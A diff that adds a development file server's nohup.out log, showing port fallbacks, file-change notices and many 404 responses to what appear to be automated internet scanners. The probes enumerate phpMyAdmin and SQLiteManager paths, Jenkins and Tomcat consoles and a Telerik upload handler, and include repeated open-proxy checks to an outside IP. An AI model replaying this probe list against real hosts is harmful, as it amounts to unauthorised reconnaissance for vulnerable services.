@@ -1,0 +1,1990 @@
+[33mhttp://0.0.0.0:8180 is already in use. Trying another port.[39m
+[36mReady for changes[39m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[32mServing "/home/visrvadmin/dev/fileServer/client" at http://127.0.0.1:46071[39m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[33mhttp://0.0.0.0:8180 is already in use. Trying another port.[39m
+[36mReady for changes[39m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[32mServing "/home/visrvadmin/dev/fileServer/client" at http://127.0.0.1:43323[39m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[32mServing "/home/visrvadmin/dev/fileServer/client" at http://127.0.0.1:8090[39m
+[36mReady for changes[39m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m2.505 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/forServer.tar
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/forServer.tar
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/forServer/background.jpg
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST /api/logout [33m405 [0m0.128 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /img/foto-profile-1.png [33m404 [0m0.636 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST /api/logout [33m405 [0m0.102 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST /api/logout [33m405 [0m0.061 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /api/logout [33m404 [0m0.803 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mPOST /api/logout [33m405 [0m0.073 ms - 0[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.508 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.542 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /robots.txt [33m404 [0m0.411 ms - 149[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sitemap.xml [33m404 [0m0.327 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /.well-known/security.txt [33m404 [0m0.398 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.334 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.500 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.412 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.529 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.356 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.426 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login [33m404 [0m0.439 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /login [33m404 [0m0.471 ms - 144[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.531 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.421 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.459 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.983 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.572 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.382 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.364 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.947 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.440 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.029 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.249 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.417 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.569 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.880 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.395 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.380 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.380 ms - 146[0m
+[0mGET /HNAP1/ [33m404 [0m0.438 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.777 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.387 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.938 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://www.msftncsi.com/ncsi.txt [33m404 [0m0.484 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /HNAP1/ [33m404 [0m0.392 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /hudson/script [33m404 [0m0.398 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /script [33m404 [0m0.456 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlite/main.php [33m404 [0m0.427 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlitemanager/main.php [33m404 [0m0.424 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLiteManager/main.php [33m404 [0m0.414 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLite/main.php [33m404 [0m0.361 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQlite/main.php [33m404 [0m0.374 ms - 154[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /main.php [33m404 [0m0.409 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /test/sqlite/SQLiteManager-1.2.0/SQLiteManager-1.2.0/main.php [33m404 [0m0.499 ms - 199[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /SQLiteManager-1.2.4/main.php [33m404 [0m0.450 ms - 167[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /agSearch/SQlite/main.php [33m404 [0m0.433 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmyadmin/ [33m404 [0m0.416 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin/ [33m404 [0m0.408 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /PMA/ [33m404 [0m0.445 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /pma/ [33m404 [0m0.420 ms - 143[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /admin/ [33m404 [0m0.413 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /dbadmin/ [33m404 [0m0.419 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysql/ [33m404 [0m0.398 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /myadmin/ [33m404 [0m0.350 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /openserver/phpmyadmin/ [33m404 [0m0.391 ms - 161[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmyadmin2/ [33m404 [0m0.425 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin2/ [33m404 [0m0.429 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2/ [33m404 [0m0.434 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /php-my-admin/ [33m404 [0m0.416 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.2.3/ [33m404 [0m0.421 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.2.6/ [33m404 [0m0.425 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.1/ [33m404 [0m0.410 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.4/ [33m404 [0m0.419 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-rc1/ [33m404 [0m0.438 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-rc2/ [33m404 [0m0.441 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5/ [33m404 [0m0.438 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.5-pl1/ [33m404 [0m0.417 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6-rc1/ [33m404 [0m0.422 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6-rc2/ [33m404 [0m0.418 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.6/ [33m404 [0m0.427 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.7/ [33m404 [0m0.406 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.5.7-pl1/ [33m404 [0m0.411 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-alpha/ [33m404 [0m0.411 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-alpha2/ [33m404 [0m0.434 ms - 163[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-beta1/ [33m404 [0m0.407 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-beta2/ [33m404 [0m0.400 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc1/ [33m404 [0m0.409 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc2/ [33m404 [0m0.394 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-rc3/ [33m404 [0m0.400 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0/ [33m404 [0m0.460 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl1/ [33m404 [0m0.424 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl2/ [33m404 [0m0.406 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.0-pl3/ [33m404 [0m0.424 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-rc1/ [33m404 [0m0.417 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-rc2/ [33m404 [0m0.431 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1/ [33m404 [0m0.425 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl1/ [33m404 [0m0.461 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl2/ [33m404 [0m1.271 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.1-pl3/ [33m404 [0m0.411 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m0.477 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-beta1/ [33m404 [0m0.399 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-rc1/ [33m404 [0m0.414 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2/ [33m404 [0m0.475 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.2-pl1/ [33m404 [0m0.555 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m0.385 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3-rc1/ [33m404 [0m0.664 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3/ [33m404 [0m5.749 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.3-pl1/ [33m404 [0m0.515 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-rc1/ [33m404 [0m0.404 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl1/ [33m404 [0m0.391 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl2/ [33m404 [0m0.396 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl3/ [33m404 [0m0.400 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4-pl4/ [33m404 [0m0.608 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.6.4/ [33m404 [0m0.396 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-beta1/ [33m404 [0m0.394 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-rc1/ [33m404 [0m0.413 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-pl1/ [33m404 [0m0.626 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0-pl2/ [33m404 [0m0.385 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.7.0/ [33m404 [0m0.404 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-beta1/ [33m404 [0m0.420 ms - 162[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-rc1/ [33m404 [0m0.435 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0-rc2/ [33m404 [0m0.376 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0/ [33m404 [0m0.818 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.1/ [33m404 [0m0.434 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.2/ [33m404 [0m0.387 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.3/ [33m404 [0m0.392 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.0.4/ [33m404 [0m0.378 ms - 158[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.1-rc1/ [33m404 [0m0.374 ms - 160[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.1/ [33m404 [0m0.384 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpMyAdmin-2.8.2/ [33m404 [0m0.358 ms - 156[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlmanager/ [33m404 [0m0.390 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysqlmanager/ [33m404 [0m0.410 ms - 152[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /p/m/a/ [33m404 [0m0.390 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /PMA2005/ [33m404 [0m0.403 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /pma2005/ [33m404 [0m0.420 ms - 147[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmanager/ [33m404 [0m0.428 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /php-myadmin/ [33m404 [0m0.405 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /phpmy-admin/ [33m404 [0m0.407 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /webadmin/ [33m404 [0m0.405 ms - 148[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /sqlweb/ [33m404 [0m0.405 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /websql/ [33m404 [0m0.442 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /webdb/ [33m404 [0m0.444 ms - 145[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysqladmin/ [33m404 [0m0.405 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /mysql-admin/ [33m404 [0m0.387 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.848 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.724 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.505 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.519 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.373 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.461 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.473 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.546 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.355 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.292 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.196 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.559 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /manager/html [33m404 [0m0.894 ms - 151[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.510 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.720 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.449 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.793 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.689 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.441 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.569 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.557 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.464 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.421 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.862 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m1.545 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.789 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.358 ms - 146[0m
+[0mGET /favicon.ico [33m404 [0m0.432 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m46.681 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /Telerik.Web.UI.WebResource.axd?type=rau [33m404 [0m0.770 ms - 169[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.763 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.334 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.336 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.369 ms - 146[0m
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.559 ms - 146[0m
+[0mGET /favicon.ico [33m404 [0m0.453 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.390 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.457 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.751 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET http://110.249.212.46/testget?q=23333&port=8090 [33m404 [0m0.534 ms - 146[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /nice%20ports%2C/Tri%6Eity.txt%2ebak [33m404 [0m0.676 ms - 174[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mGET /favicon.ico [33m404 [0m0.484 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
+[0mHEAD /robots.txt [33m404 [0m0.800 ms - 150[0m
+[36mChange detected[39m /home/visrvadmin/dev/fileServer/client/nohup.out
